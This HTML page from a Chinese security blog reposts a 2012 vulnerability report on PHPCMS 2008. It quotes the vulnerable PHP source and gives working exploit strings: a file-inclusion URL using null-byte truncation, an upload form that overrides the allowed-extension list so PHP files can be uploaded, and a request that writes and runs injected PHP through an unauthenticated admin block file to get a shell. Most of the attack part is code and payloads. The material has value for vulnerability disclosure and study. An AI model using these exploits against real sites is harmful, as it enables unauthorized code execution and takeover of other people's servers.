<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>phpcms 2008多个漏洞 (可getshell) | Return&#39;s Blog </title>
  <meta name="author" content="Return">
  
  <meta name="description" content="专注于互联网开发技术，注重网络安全技术，注重网络攻防技术，注重渗透测试技术，backtrack5渗透测试平台研究，软件开发，网页设计，网页制作，网站建设">
  
  
  <meta property="og:title" content="phpcms 2008多个漏洞 (可getshell)"/>
  <meta property="og:site_name" content="Return&#39;s Blog "/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta property="og:image" content="undefined"/>
  
   <link rel="apple-touch-icon" href="/icon.png" />
   <link rel="shortcut icon" href="/favicon.png" >
   <link rel="alternate" href="http://www.creturn.com/atom.xml" title="Return&#39;s Blog " type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
</head>


<body>
  <div id="content" class="inner">
    <aside id="sidebar" class="alignleft">
      <div class="navigationBar">
        <a href="/">Return&#39;s Blog </a>
      </div>
    	
  <nav class="widget" id="menu">
	<ul>
    
      <li class="cell"><a class="next" href="/">Home</a><li>
    
      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
    
      <li class="cell"><a class="next" href="/about/">About</a><li>
    
    </ul>
</nav>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/原创作品/">原创作品</a><small>30</small></li>
  
    <li><a href="/categories/原创作品/技术文章/">技术文章</a><small>23</small></li>
  
    <li><a href="/categories/技术文章/">技术文章</a><small>7</small></li>
  
    <li><a href="/categories/原创作品/技术文章/最新漏洞/">最新漏洞</a><small>3</small></li>
  
    <li><a href="/categories/技术文章/最新漏洞/">最新漏洞</a><small>2</small></li>
  
    <li><a href="/categories/最新漏洞/">最新漏洞</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/Android/" style="font-size: 10.00px;">Android</a><a href="/tags/Backtrack5/" style="font-size: 10.00px;">Backtrack5</a><a href="/tags/Metasploit/" style="font-size: 10.00px;">Metasploit</a><a href="/tags/Mysql/" style="font-size: 10.00px;">Mysql</a><a href="/tags/Nginx解析漏洞/" style="font-size: 10.00px;">Nginx解析漏洞</a><a href="/tags/Return/" style="font-size: 10.00px;">Return</a><a href="/tags/ThinkPHP远程/" style="font-size: 10.00px;">ThinkPHP远程</a><a href="/tags/alfred/" style="font-size: 10.00px;">alfred</a><a href="/tags/android/" style="font-size: 13.33px;">android</a><a href="/tags/apache/" style="font-size: 10.00px;">apache</a><a href="/tags/armitage/" style="font-size: 10.00px;">armitage</a><a href="/tags/arp欺骗/" style="font-size: 10.00px;">arp欺骗</a><a href="/tags/cain/" style="font-size: 10.00px;">cain</a><a href="/tags/dedecms漏洞/" style="font-size: 10.00px;">dedecms漏洞</a><a href="/tags/easyui/" style="font-size: 10.00px;">easyui</a><a href="/tags/eclipse/" style="font-size: 10.00px;">eclipse</a><a href="/tags/java/" style="font-size: 10.00px;">java</a><a href="/tags/linux arp欺骗/" style="font-size: 10.00px;">linux arp欺骗</a><a href="/tags/os x/" style="font-size: 10.00px;">os x</a><a href="/tags/php/" style="font-size: 13.33px;">php</a><a href="/tags/phpcmsv9漏洞/" style="font-size: 16.67px;">phpcmsv9漏洞</a><a href="/tags/phpcsm2008漏洞/" style="font-size: 10.00px;">phpcsm2008漏洞</a><a href="/tags/python/" style="font-size: 13.33px;">python</a><a href="/tags/thinkPHP漏洞/" style="font-size: 10.00px;">thinkPHP漏洞</a><a href="/tags/ubuntu/" style="font-size: 10.00px;">ubuntu</a><a href="/tags/web wifi认证/" style="font-size: 10.00px;">web wifi认证</a><a href="/tags/webshell/" style="font-size: 20.00px;">webshell</a><a href="/tags/window密码/" style="font-size: 10.00px;">window密码</a><a href="/tags/wordpress漏洞/" style="font-size: 13.33px;">wordpress漏洞</a><a href="/tags/workflow/" style="font-size: 10.00px;">workflow</a><a href="/tags/xUtils/" style="font-size: 10.00px;">xUtils</a><a href="/tags/互联网技术/" style="font-size: 10.00px;">互联网技术</a><a href="/tags/任意密码登录/" style="font-size: 10.00px;">任意密码登录</a><a href="/tags/任意读取文件漏洞/" style="font-size: 10.00px;">任意读取文件漏洞</a><a href="/tags/入侵/" style="font-size: 10.00px;">入侵</a><a href="/tags/后门/" style="font-size: 20.00px;">后门</a><a href="/tags/嗅探/" style="font-size: 10.00px;">嗅探</a><a href="/tags/图马/" style="font-size: 10.00px;">图马</a><a href="/tags/打飞机/" style="font-size: 10.00px;">打飞机</a><a href="/tags/注入漏洞/" style="font-size: 10.00px;">注入漏洞</a>
  </div>
</div>


    	<footer id="footer" class="inner"><div class="copyright">
  
  &copy; 2014 Return
  
</div>


<div style="position:relative; bottom: 23px">
  <script src="http://s95.cnzz.com/stat.php?id=4287542&web_id=4287542&show=pic1" language="JavaScript">
  </script>
</div>


</footer>
    </aside>
    
    
    <div id="hidden-navigationBar" class="navigationBar">
      <a href="/">Return&#39;s Blog </a>
    </div>
    <div id="main-col" class="alignright">
    <div id="wrapper">
      
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title">phpcms 2008多个漏洞 (可getshell)</h1>
  

      <time datetime="2012-07-19T15:58:57.000Z"><a href="/html/2012-07-19-phpcms-2008多个漏洞-可getshell.html">7月 19 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>本文转自乌云：<a href="http://www.wooyun.org/bugs/wooyun-2010-09563" target="_blank">http://www.wooyun.org/bugs/wooyun-2010-09563</a>
[php]</p>
<h3 id="-">文件包含</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
</pre></td><td class="code"><pre><span class="preprocessor">&lt;?php</span>
define(<span class="string">'IN_YP'</span>, <span class="keyword">TRUE</span>);
define(<span class="string">'ADMIN_ROOT'</span>, str_replace(&quot;&quot;, <span class="string">'/'</span>,dirname(<span class="keyword">__FILE__</span>)).<span class="string">'/'</span>);
<span class="keyword">require</span> <span class="string">'../include/common.inc.php'</span>;
</pre></td></tr></table></figure>

<h2 id="-">要登陆</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre><span class="keyword">if</span>(!<span class="variable">$_userid</span>) showmessage(<span class="string">'您还没有登陆，即将跳转到登陆页面'</span>,
<span class="variable">$MODULE</span>[<span class="string">'member'</span>][<span class="string">'url'</span>].<span class="string">'login.php?forward='</span>.urlencode(URL));
session_start();
</pre></td></tr></table></figure>

<h2 id="-file-">$file变量可控制</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>) || <span class="keyword">empty</span>(<span class="variable">$file</span>)) <span class="variable">$file</span> = <span class="string">'panel'</span>;

<span class="comment">/* $company_user_infos 获取企业会员信息 */</span>
<span class="variable">$company_user_infos</span> = <span class="variable">$db</span>-&gt;get_one(&quot;SELECT * FROM `&quot;.DB_PRE.&quot;member_company` 
WHERE `userid`=<span class="string">'$_userid'</span>&quot;);
<span class="variable">$userid</span> = <span class="variable">$_userid</span>;
</pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="-">注册的时候选择企业用户</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre></td><td class="code"><pre><span class="keyword">if</span>(!<span class="variable">$company_user_infos</span>)
{
 <span class="variable">$MS</span>[<span class="string">'title'</span>] = <span class="string">'您不是企业会员'</span>;
 <span class="variable">$MS</span>[<span class="string">'description'</span>] = <span class="string">'你可以做下面操作'</span>;
 <span class="variable">$MS</span>[<span class="string">'urls'</span>][<span class="number">0</span>] = <span class="keyword">array</span>(
 <span class="string">'name'</span>=&gt;<span class="string">'免费升级为企业会员'</span>,
 <span class="string">'url'</span>=&gt;<span class="variable">$PHPCMS</span>[<span class="string">'siteurl'</span>].<span class="variable">$M</span>[<span class="string">'url'</span>].<span class="string">'company.php?action=member'</span>,
 );
 <span class="variable">$MS</span>[<span class="string">'urls'</span>][<span class="number">1</span>] = <span class="keyword">array</span>(
 <span class="string">'name'</span>=&gt;<span class="string">'退出当前帐号，换其他帐号登陆'</span>,
 <span class="string">'url'</span>=&gt;<span class="variable">$PHPCMS</span>[<span class="string">'siteurl'</span>].<span class="string">'member/logout.php'</span>,
 );
 <span class="variable">$MS</span>[<span class="string">'urls'</span>][<span class="number">2</span>] = <span class="keyword">array</span>(
 <span class="string">'name'</span>=&gt;<span class="string">'重新注册为企业会员'</span>,
 <span class="string">'url'</span>=&gt;<span class="variable">$PHPCMS</span>[<span class="string">'siteurl'</span>].<span class="string">'member/logout.php?forward='</span>.
urlencode(<span class="variable">$PHPCMS</span>[<span class="string">'siteurl'</span>].<span class="string">'member/register.php'</span>),
 );
 msg(<span class="variable">$MS</span>);
}
<span class="variable">$CATEGORY</span> = subcat(<span class="string">'yp'</span>);
<span class="variable">$siteurl</span> = company_url(<span class="variable">$userid</span>, <span class="variable">$company_user_infos</span>[<span class="string">'sitedomain'</span>]);

<span class="variable">$_SESSION</span>[<span class="string">'url'</span>] = QUERY_STRING;

<span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">'company'</span> &amp;&amp; <span class="variable">$M</span>[<span class="string">'enableSecondDomain'</span>] &amp;&amp;
 !<span class="variable">$company_user_infos</span>[<span class="string">'sitedomain'</span>]) 
showmessage(<span class="string">'请先绑定您的二级域名'</span>,BUSINESSDIR.<span class="string">'?file=company'</span>);

check_priv(<span class="variable">$file</span>);
<span class="variable">$GROUP</span> = cache_read(<span class="string">'member_group.php'</span>);

<span class="comment">## 此处直接包含了，注意$file是可以控制的但须要截断</span>
<span class="keyword">if</span>(!@<span class="keyword">include</span> ADMIN_ROOT.<span class="variable">$file</span>.<span class="string">'.inc.php'</span>) 
showmessage(<span class="string">'The file ./yp/'</span>.<span class="variable">$file</span>.<span class="string">'.inc.php is not exists!'</span>);

<span class="function"><span class="keyword">function</span> <span class="title">check_priv</span><span class="params">(<span class="variable">$file</span>)</span>
{</span>
 <span class="keyword">global</span> <span class="variable">$M</span>,<span class="variable">$PHPCMS</span>,<span class="variable">$_groupid</span>;
 <span class="keyword">if</span>(!<span class="variable">$M</span>[&quot;allow_add_<span class="variable">$file</span>&quot;]) <span class="keyword">return</span> <span class="keyword">true</span>;
 <span class="keyword">if</span>(!in_array(<span class="variable">$_groupid</span>,<span class="variable">$M</span>[&quot;allow_add_<span class="variable">$file</span>&quot;]))
 {
 <span class="variable">$MS</span>[<span class="string">'title'</span>] = <span class="string">'您所在的会员组没有此项操作权限'</span>;
 <span class="variable">$MS</span>[<span class="string">'description'</span>] = <span class="string">'你可以做下面操作'</span>;
 <span class="variable">$MS</span>[<span class="string">'urls'</span>][<span class="number">0</span>] = <span class="keyword">array</span>(
 <span class="string">'name'</span>=&gt;<span class="string">'升级会员组'</span>,
 <span class="string">'url'</span>=&gt;<span class="variable">$PHPCMS</span>[<span class="string">'siteurl'</span>].<span class="string">'member/upgrade.php'</span>,
 );
 <span class="variable">$MS</span>[<span class="string">'urls'</span>][<span class="number">1</span>] = <span class="keyword">array</span>(
 <span class="string">'name'</span>=&gt;<span class="string">'返回商务中心'</span>,
 <span class="string">'url'</span>=&gt;<span class="string">'?'</span>,
 );
 msg(<span class="variable">$MS</span>);
 }
}
<span class="preprocessor">?&gt;</span>
</pre></td></tr></table></figure>

<h2 id="-">利用注册一个企业用户</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>EXP:http:<span class="comment">//localhost/phpcms/yp/business/?file=../../xxoo.txt%00.</span>
</pre></td></tr></table></figure>

<p>由于涉及截断，所以鸡肋了，哥是要去拿shell的。</p>
<h2 id="-">再看这一句</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre><span class="keyword">if</span>(!@<span class="keyword">include</span> ADMIN_ROOT.<span class="variable">$file</span>.<span class="string">'.inc.php'</span>) 
showmessage(<span class="string">'The file ./yp/'</span>.<span class="variable">$file</span>.<span class="string">'.inc.php is not exists!'</span>);
</pre></td></tr></table></figure>

<p>以.inc.php结尾的文件有大把随便找个有漏的文件包含进来，不就能二次利用了？</p>
<h2 id="-admin-upload-inc-php">首先进入视线的是/admin/upload.inc.php</h2>
<p>看名字就知道如果能利用的话，将会.....(省略500字)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="code"><pre><span class="preprocessor">&lt;?php</span>
defined(<span class="string">'IN_PHPCMS'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);

<span class="keyword">require_once</span> <span class="string">'attachment.class.php'</span>;

<span class="variable">$attachment</span> = <span class="keyword">new</span> attachment(<span class="variable">$mod</span>);
<span class="keyword">if</span>(<span class="variable">$catid</span>)
{
 <span class="variable">$C</span> = cache_read(<span class="string">'category_'</span>.<span class="variable">$catid</span>.<span class="string">'.php'</span>);
}
<span class="comment">## 允许上传的后缀是从$C里取的，变量$C要通过上面那个判断才能赋值，典型的变量未初始化</span>
<span class="variable">$upload_allowext</span> = <span class="variable">$C</span>[<span class="string">'upload_allowext'</span>] ? <span class="variable">$C</span>[<span class="string">'upload_allowext'</span>] : 
UPLOAD_ALLOWEXT;
<span class="variable">$upload_maxsize</span> = <span class="variable">$C</span>[<span class="string">'upload_maxsize'</span>] ? <span class="variable">$C</span>[<span class="string">'upload_maxsize'</span>] : 
UPLOAD_MAXSIZE;
<span class="keyword">if</span>(<span class="variable">$dosubmit</span>)
{
 <span class="variable">$attachment</span>-&gt;upload(<span class="string">'uploadfile'</span>, <span class="variable">$upload_allowext</span>, <span class="variable">$upload_maxsize</span>, <span class="number">1</span>);
 <span class="keyword">if</span>(<span class="variable">$attachment</span>-&gt;error) showmessage(<span class="variable">$attachment</span>-&gt;error());
 <span class="comment">//判断是否开启附件ftp上传，返回图片路径</span>
 <span class="variable">$imgurl</span> = UPLOAD_FTP_ENABLE ? <span class="variable">$attachment</span>-&gt;uploadedfiles[<span class="number">0</span>][<span class="string">'filepath'</span>] : 
UPLOAD_URL.<span class="variable">$attachment</span>-&gt;uploadedfiles[<span class="number">0</span>][<span class="string">'filepath'</span>];
 <span class="variable">$aid</span> = <span class="variable">$attachment</span>-&gt;uploadedfiles[<span class="number">0</span>][<span class="string">'aid'</span>];
 <span class="variable">$filesize</span> = <span class="variable">$attachment</span>-&gt;uploadedfiles[<span class="number">0</span>][<span class="string">'filesize'</span>];
 <span class="variable">$filesize</span> = <span class="variable">$attachment</span>-&gt;size(<span class="variable">$filesize</span>);
 <span class="keyword">if</span>(<span class="variable">$isthumb</span> || <span class="variable">$iswatermark</span>)
 {
 <span class="keyword">require_once</span> <span class="string">'image.class.php'</span>;
 <span class="variable">$image</span> = <span class="keyword">new</span> image();
 <span class="variable">$img</span> = UPLOAD_ROOT.<span class="variable">$attachment</span>-&gt;uploadedfiles[<span class="number">0</span>][<span class="string">'filepath'</span>];
 <span class="keyword">if</span>(<span class="variable">$isthumb</span>)
 {
 <span class="variable">$image</span>-&gt;thumb(<span class="variable">$img</span>, <span class="variable">$img</span>, <span class="variable">$width</span>, <span class="variable">$height</span>);
 }
 <span class="keyword">if</span>(<span class="variable">$iswatermark</span>)
 {
 <span class="variable">$image</span>-&gt;watermark(<span class="variable">$img</span>, <span class="variable">$img</span>, <span class="variable">$PHPCMS</span>[<span class="string">'watermark_pos'</span>], 
<span class="variable">$PHPCMS</span>[<span class="string">'watermark_img'</span>], <span class="string">''</span>, <span class="number">5</span>, <span class="string">'#ff0000'</span>, <span class="variable">$PHPCMS</span>[<span class="string">'watermark_jpgquality'</span>]);
 }
 }

showmessage(&quot;文件上传成功！&lt;script language=<span class="string">'javascript'</span>&gt; 
<span class="keyword">try</span>{ $(window.opener.document).find(&quot;form[@name=<span class="string">'myform'</span>] <span class="comment">#$uploadtext&quot;).</span>
val(&quot;<span class="variable">$imgurl</span>&quot;);$(window.opener.document).find(&quot;form[@name=<span class="string">'myform'</span>] 
<span class="comment">#{$uploadtext}_aid&quot;).val(&quot;$aid&quot;);$(window.opener.document).</span>
find(&quot;form[@name=<span class="string">'myform'</span>] <span class="comment">#$filesize&quot;).val(&quot;$filesize&quot;);}catch(e){}</span>
 window.close();&lt;/script&gt;&quot;, HTTP_REFERER);
}
<span class="keyword">else</span>
{
 <span class="keyword">include</span> admin_tpl(<span class="string">'upload'</span>);
}
<span class="preprocessor">?&gt;</span>
</pre></td></tr></table></figure>

<h2 id="-exp-">没什么好说的看EXP, 上传后查看网页源代码即可找到上传路径.</h2>
<figure class="highlight html"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
</pre></td><td class="code"><pre><span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">&quot;frmUpload&quot;</span> <span class="attribute">enctype</span>=<span class="value">&quot;multipart</span>/<span class="attribute">form-data</span>&<span class="attribute">quot</span>;
<span class="attribute">action</span>=<span class="value">&quot;http:</span>//<span class="attribute">localhost</span>/<span class="attribute">phpcms</span>/<span class="attribute">yp</span>/<span class="attribute">business</span>/?<span class="attribute">file</span>=
<span class="attribute">..</span>/<span class="attribute">..</span>/<span class="attribute">admin</span>/<span class="attribute">upload</span>&<span class="attribute">amp</span>;<span class="attribute">C</span>[<span class="attribute">upload_allowext</span>]=<span class="value">php|Php%00.|php%00&amp;dosubmit=yes&quot;</span> 
<span class="attribute">method</span>=<span class="value">"post"</span>&gt;</span>;
<span class="tag">&lt;<span class="title">h1</span>&gt;</span>Upload a new file:<span class="tag">&lt;/<span class="title">h1</span>&gt;</span>
&lt;input type=&quot;file&quot; name=&quot;uploadfile&quot; size=&quot;50&quot;&gt;&lt;br&gt;
&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;
&lt;/form&gt;
</pre></td></tr></table></figure>

<h2 id="-attachment-class-php-">传完后我才发现attachment.class.php 里有黑名单，怎么绕大家结合环境利用吧。</h2>
<h2 id="-block-inc-php-">漏洞再一次被鸡肋化了，哥继续找。 再次进入视线的是block.inc.php，</h2>
<p>看名字貌似是跟模块有关的，难不成可以写个shell ?</p>
<h2 id="-admin-">猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。</h2>
<h2 id="-144-action-post-">看144行左右，当$action 等于 post时。</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="code"><pre><span class="keyword">case</span> <span class="string">'post'</span>:
 <span class="keyword">require_once</span> <span class="string">'template.func.php'</span>;
 <span class="keyword">if</span>(<span class="variable">$func</span> == <span class="string">'dosave'</span>) <span class="comment">## 这里完全不用管他，让他进入else</span>
 {
 <span class="variable">$block</span>-&gt;set_template(<span class="variable">$blockid</span>, <span class="variable">$template</span>);
 <span class="variable">$block</span>-&gt;update(<span class="variable">$blockid</span>, <span class="variable">$data</span>);
 <span class="variable">$data</span> = <span class="variable">$block</span>-&gt;get_html(<span class="variable">$blockid</span>);
 }
 <span class="keyword">else</span>
 {
 <span class="variable">$name</span> = new_stripslashes(<span class="variable">$name</span>);
 <span class="variable">$data</span> = new_stripslashes(<span class="variable">$data</span>);
 <span class="variable">$data</span> = <span class="variable">$block</span>-&gt;strip_data(<span class="variable">$data</span>);
 <span class="variable">$template</span> = new_stripslashes(<span class="variable">$template</span>);
 <span class="variable">$tpldata</span> = template_parse(<span class="variable">$template</span>);
 <span class="variable">$tplfile</span> = TPL_CACHEPATH.<span class="string">'block_'</span>.<span class="variable">$blockid</span>.<span class="string">'.preview.php'</span>; <span class="comment">## 文件名</span>
 file_put_contents(<span class="variable">$tplfile</span>, <span class="variable">$tpldata</span>); <span class="comment">## 生成文件</span>
 <span class="keyword">include</span> <span class="variable">$tplfile</span>; <span class="comment">## 包含文件</span>
 @unlink(<span class="variable">$tplfile</span>); <span class="comment">## 删除刚才生成的文件</span>
 <span class="variable">$data</span> = ob_get_contents();
 ob_clean();
 }
 <span class="keyword">echo</span> <span class="string">'&lt;script language=&quot;JavaScript&quot;&gt;parent.'</span>.<span class="variable">$func</span>.<span class="string">'('</span>.<span class="variable">$blockid</span>.<span class="string">',
 &quot;'</span>.format_js(<span class="variable">$data</span>, <span class="number">0</span>).<span class="string">'&quot;);&lt;/script&gt;'</span>;
 <span class="keyword">break</span>;
</pre></td></tr></table></figure>

<h2 id="-php-">在这里可以生成一个php文件，并马上包含进来，随后又删除了。由于包含进来了，</h2>
<h1 id="-php-">只要能控制php文件的内容，代码还是会被执行。</h1>
<h2 id="-tpldata-template_parse-template-">看取得文件内容的这一行，$tpldata = template_parse($template);</h2>
<h1 id="-template_parse-">跟进template_parse函数</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="code"><pre><span class="function"><span class="keyword">function</span> <span class="title">template_parse</span><span class="params">(<span class="variable">$str</span>, <span class="variable">$istag</span> = <span class="number">0</span>)</span>
{</span>
 <span class="variable">$str</span> = preg_replace(&quot;/([nr]+)t+/s&quot;,&quot;<span class="number">1</span>&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/&lt;!--{(.+?)}--&gt;/s&quot;,
 &quot;{<span class="number">1</span>}&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{templates+(.+)}/&quot;,
&quot;&lt;?php <span class="keyword">include</span> template(<span class="number">1</span>); ?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{includes+(.+)}/&quot;,
&quot;&lt;?php <span class="keyword">include</span> <span class="number">1</span>; ?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{phps+(.+)}/&quot;,
&quot;&lt;?php <span class="number">1</span>?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{ifs+(.+?)}/&quot;,
&quot;&lt;?php <span class="keyword">if</span>(<span class="number">1</span>) { ?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{<span class="keyword">else</span>}/&quot;,&quot;&lt;?php } <span class="keyword">else</span> { ?&gt;&quot;
,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{elseifs+(.+?)}/&quot;,&quot;&lt;?php } <span class="keyword">elseif</span> (<span class="number">1</span>) { ?&gt;&quot;,
<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{/<span class="keyword">if</span>}/&quot;,&quot;&lt;?php } ?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{loops+(S+)s+(S+)}/&quot;,&quot;&lt;?php 
<span class="keyword">if</span>(is_array(<span class="number">1</span>))<span class="keyword">foreach</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="number">2</span>) { ?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{loops+(S+)s+(S+)s+(S+)}/&quot;,&quot;&lt;?php 
<span class="keyword">if</span>(is_array(<span class="number">1</span>)) <span class="keyword">foreach</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="number">2</span> =&gt; <span class="number">3</span>) { ?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{/loop}/&quot;,&quot;&lt;?php } ?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{/get}/&quot;,&quot;&lt;?php } <span class="keyword">unset</span>(<span class="variable">$DATA</span>); ?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{tag_([^}]+)}/e&quot;, &quot;get_tag(<span class="string">'1'</span>)&quot;, <span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{gets+([^}]+)}/e&quot;, &quot;get_parse(<span class="string">'1'</span>)&quot;, <span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{([a-zA-Z_x7f-xff][a-zA-Z0-<span class="number">9</span>_x7f-xff:]
*(([^{}]*)))}/&quot;,&quot;&lt;?php <span class="keyword">echo</span> <span class="number">1</span>;?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{$([a-zA-Z_x7f-xff][a-zA-Z0-<span class="number">9</span>_x7f-xff:]
*(([^{}]*)))}/&quot;,&quot;&lt;?php <span class="keyword">echo</span> <span class="number">1</span>;?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{($[a-zA-Z_x7f-xff][a-zA-Z0-<span class="number">9</span>_x7f-xff]*)}/&quot;,
&quot;&lt;?php <span class="keyword">echo</span> <span class="number">1</span>;?&gt;&quot;,<span class="variable">$str</span>);
 <span class="variable">$str</span> = preg_replace(&quot;/{($[a-zA-Z0-<span class="number">9</span>_[]<span class="string">'&quot;$x7f-xff]+)}/es&quot;,
 &quot;addquote('</span>&lt;?php <span class="keyword">echo</span> <span class="number">1</span>;?&gt;<span class="string">')&quot;,$str);
 $str = preg_replace(&quot;/{([A-Z_x7f-xff][A-Z0-9_x7f-xff]*)}/s&quot;,
 &quot;&lt;?php echo 1;?&gt;&quot;,$str);
 if(!$istag) $str = &quot;&lt;?php defined('</span>IN_PHPCMS<span class="string">') or exit('</span>Access Denied<span class="string">');
 ?&gt;&quot;.$str;
 return $str;
}</span>
</pre></td></tr></table></figure>

<h2 id="-">是用来处理一些模板语法，完全不用理会。</h2>
<figure class="highlight shell"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre><span class="constant">EXP</span><span class="symbol">:http</span><span class="symbol">://localhost/yp/business/</span>?file=../../
admin/block&amp;action=post&amp;blockid=eval&amp;template=&lt;?php phpinfo();exit();?&gt;
</pre></td></tr></table></figure>

<p><a href="http://asset.creturn.com/asset/uploads/2012/07/phpcms2008.jpg" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/phpcms2008.jpg" alt="" title="phpcms2008"></a></p>
<p>其实我觉得之前的那个注入漏洞比较严重~</p>

	 
	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
<span>Posted by <a style="color:#9f9f9f;" href="null"><strong>creturn</strong></a> - 7月 19 2012</span><br />
<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://creturn.com"><strong>Return&#39;s Blog </strong></a></span>
</p>
       	 
      
    </div>
    <footer>
      
	 
     		  
  
  <div class="categories">
    <a href="/categories/技术文章/">技术文章</a>, <a href="/categories/技术文章/最新漏洞/">最新漏洞</a>
  </div>

       		
  
  <div class="tags">
    <a href="/tags/phpcsm2008漏洞/">phpcsm2008漏洞</a>
  </div>

     		  
       	 
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


</div>
    </div>
    <div class="tabbar" onload="divideTabBar()">
	
      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
    
      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
    
      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
    
</div>


  </div>
</body>
</html>